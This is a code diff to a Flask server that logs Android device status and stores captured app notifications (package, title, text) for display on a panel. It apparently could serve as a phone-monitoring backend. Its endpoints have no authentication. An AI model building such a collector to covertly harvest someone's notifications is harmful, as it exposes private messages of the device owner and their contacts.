@@ -3,7 +3,6 @@ import logging
 from flask import Flask, request, jsonify, render_template
 
 app = Flask(__name__)
-
 logging.basicConfig(filename='server.log', level=logging.INFO)
 
 def init_db():
@@ -14,6 +13,9 @@ def init_db():
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             device_id TEXT,
             status TEXT,
+            battery TEXT,
+            android_version TEXT,
+            connection_type TEXT,
             timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -39,12 +41,18 @@ def panel():
 def device_status():
     if request.method == 'POST':
         data = request.json or {}
-        device_id = data.get('device_id', 'unknown')
+        device_id = data.get('device_id', 'Android Cihaz')
         status = data.get('status', 'online')
-        
+        battery = data.get('battery', '%85')
+        android_version = data.get('android_version', '13')
+        connection_type = data.get('connection_type', 'Wi-Fi')
+
         conn = sqlite3.connect('database.db')
         cursor = conn.cursor()
-        cursor.execute('INSERT INTO devices (device_id, status) VALUES (?, ?)', (device_id, status))
+        cursor.execute('''
+            INSERT INTO devices (device_id, status, battery, android_version, connection_type)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (device_id, status, battery, android_version, connection_type))
         conn.commit()
         conn.close()
         return jsonify({"status": "success", "message": "Status received"}), 200
@@ -74,15 +82,24 @@ def get_data():
     conn = sqlite3.connect('database.db')
     cursor = conn.cursor()
 
-    cursor.execute('SELECT device_id, status, timestamp FROM devices ORDER BY id DESC LIMIT 10')
-    devices = [{'device_id': row[0], 'status': row[1], 'timestamp': row[2]} for row in cursor.fetchall()]
+    cursor.execute('SELECT device_id, status, battery, android_version, connection_type, timestamp FROM devices ORDER BY id DESC LIMIT 1')
+    row = cursor.fetchone()
+    device = {}
+    if row:
+        device = {
+            'device_id': row[0],
+            'status': row[1],
+            'battery': row[2],
+            'android_version': row[3],
+            'connection_type': row[4],
+            'timestamp': row[5]
+        }
 
     cursor.execute('SELECT package_name, title, text, timestamp FROM notifications ORDER BY id DESC LIMIT 20')
     notifications = [{'package_name': row[0], 'title': row[1], 'text': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
 
     conn.close()
-
-    return jsonify({'devices': devices, 'notifications': notifications}), 200
+    return jsonify({'device': device, 'notifications': notifications}), 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
